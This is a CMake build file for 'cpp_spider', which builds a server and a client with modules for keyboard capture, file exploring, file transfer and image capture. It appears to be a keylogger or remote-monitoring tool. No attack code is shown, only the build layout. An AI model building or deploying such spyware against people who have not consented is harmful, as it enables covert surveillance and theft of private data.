cmake_minimum_required(VERSION 3.0)
project(cpp_spider)

set(CMAKE_EXPORT_COMPILE_COMMANDS "ON")

if (WIN32)
  set(BOOST_ROOT "C:/local/boost_1_65_1")
  link_directories("${BOOST_ROOT}/lib64-msvc-14.1")

  find_package(OPENSSL)
elseif(APPLE)
  find_package(OPENSSL)
else()
  find_package(PkgConfig)
  pkg_search_module(OPENSSL REQUIRED openssl)
endif()

find_package(libmongocxx REQUIRED)
find_package(libbsoncxx REQUIRED)
find_package(Boost REQUIRED COMPONENTS thread chrono date_time filesystem system )

include_directories(SYSTEM ${LIBMONGOCXX_INCLUDE_DIR})
include_directories(SYSTEM ${LIBBSONCXX_INCLUDE_DIR})
include_directories(SYSTEM "/usr/local/include/mongocxx/v_noabi")
include_directories(SYSTEM "/usr/local/include/bsoncxx/v_noabi")
include_directories(SYSTEM "/usr/local/lib")
include_directories(${Boost_INCLUDE_DIRS})
include_directories(${CMAKE_CURRENT_SOURCE_DIR}/)
include_directories(${OPENSSL_INCLUDE_DIR})

#############################################################################
###################  Cmake SERVEUR  #########################################
#############################################################################

set(EXE_SERVER_NAME spider_serveur)

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -std=c++14 -Wall -g3")
set(SOURCE_FILES
./sources/server/main.cpp
./sources/APacketServer.cpp
./sources/AUdpServer.cpp
./sources/PacketManager.cpp
./sources/server/Server.cpp
./sources/UdpEndpoint.cpp
./sources/Packet.cpp
./sources/json.cpp
./sources/MapDB.cpp
./sources/AIntervalService.cpp
./sources/IntervalService.cpp
./sources/MongoDB.cpp
./sources/LocalDB.cpp
./sources/LocalDB.hpp
./sources/ssl/Base64.cpp
./sources/ssl/CryptAES.cpp
./sources/ssl/CryptRSA.cpp
./sources/server/CryptServer.cpp
./sources/server/HttpServer.cpp
./sources/server/HttpServer.hpp
)

if (WIN32)
  set(SOURCE_FILES
  ${SOURCE_FILE}
  ./sources/client/WinTools.cpp
  )
endif()

add_executable(${EXE_SERVER_NAME} ${SOURCE_FILES})

target_include_directories(${EXE_SERVER_NAME} PUBLIC
    ./sources
    ./libs
)

target_link_libraries(${EXE_SERVER_NAME} ${Boost_LIBRARIES})
target_link_libraries(${EXE_SERVER_NAME} ${LIBMONGOCXX_LIBRARIES})
target_link_libraries(${EXE_SERVER_NAME} ${LIBBSONCXX_LIBRARIES})
target_link_libraries(${EXE_SERVER_NAME} ${OPENSSL_LIBRARIES})

#############################################################################
###################  Cmake CLIENT   #########################################
#############################################################################

set(EXE_CLIENT_NAME spider_client)

set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -std=c++14 -Wall -pthread")

set(SOURCE_FILES
  ./sources/client/ModuleManager.cpp
  ./sources/client/ModuleCommunication.cpp
  ./sources/ssl/Base64.cpp
  ./sources/ssl/CryptAES.cpp
  ./sources/ssl/CryptRSA.cpp
  ./sources/client/CryptClient.cpp
  ./sources/ssl/CryptRSA.cpp
  ./sources/LocalDB.cpp
  ./sources/LocalDB.hpp
)

if (WIN32)
  set (SOURCE_FILES
    ${SOURCE_FILES}
    ./sources/ssl/applink.c)
endif()

set(SOURCE_FILES
  ${SOURCE_FILES}
  ./sources/client/main.cpp
  ./sources/UdpEndpoint.cpp
  ./sources/AUdpServer.cpp
  ./sources/APacketServer.cpp
  ./sources/PacketManager.cpp
  ./sources/client/Client.cpp
  ./sources/Packet.cpp
  ./sources/json.cpp
  ./sources/MapDB.cpp
  ./sources/AIntervalService.cpp
  ./sources/IntervalService.cpp
)

add_executable(${EXE_CLIENT_NAME} ${SOURCE_FILES})
target_link_libraries(${EXE_CLIENT_NAME} ${Boost_LIBRARIES})
target_link_libraries(${EXE_CLIENT_NAME} ${OPENSSL_LIBRARIES})
if (NOT WIN32)
  target_link_libraries(${EXE_CLIENT_NAME} "dl")
endif()

target_include_directories(${EXE_CLIENT_NAME} PUBLIC
    ./sources
)

#############################################################################
#############  Cmake CLIENT MODULE : KEYBOARD  ##############################
#############################################################################

set(KEYBOARD_NAME module_keyboard)

set(SOURCE_FILES sources/client/modules/ModuleKeyboard.cpp sources/client/IModule.hpp)
add_library(${KEYBOARD_NAME} SHARED ${SOURCE_FILES})
target_link_libraries(${KEYBOARD_NAME} ${Boost_LIBRARIES})

#############################################################################
#############  Cmake CLIENT MODULE : EXPLORER  ##############################
#############################################################################

set(EXPLORER_NAME module_explorer)

set(SOURCE_FILES
  ./sources/client/modules/ModuleExplorer.cpp)
add_library(${EXPLORER_NAME} SHARED ${SOURCE_FILES})
target_link_libraries(${EXPLORER_NAME} ${Boost_LIBRARIES})

target_include_directories(${EXPLORER_NAME} PUBLIC
    ./sources/
)

#############################################################################
#############  Cmake CLIENT MODULE : FILE ###################################
#############################################################################

set(FILE_NAME module_file)

set(SOURCE_FILES
  ./sources/client/modules/ModuleFile.cpp
  ./sources/ssl/Base64.cpp)
add_library(${FILE_NAME} SHARED ${SOURCE_FILES})
target_link_libraries(${FILE_NAME} ${Boost_LIBRARIES})

target_include_directories(${FILE_NAME} PUBLIC
    ./sources/
)

#############################################################################
#############  Cmake CLIENT MODULE : IMAGE     ##############################
#############################################################################

set(IMAGE_NAME module_image)

set (SOURCE_FILES
  ./sources/client/modules/ModuleImage.cpp)
#add_library(${IMAGE_NAME} SHARED ${SOURCE_FILES})
add_executable(${IMAGE_NAME} ${SOURCE_FILES})
target_link_libraries(${IMAGE_NAME} ${Boost_LIBRARIES} gdiplus.lib)

target_include_directories(${IMAGE_NAME} PUBLIC
    ./sources/
)
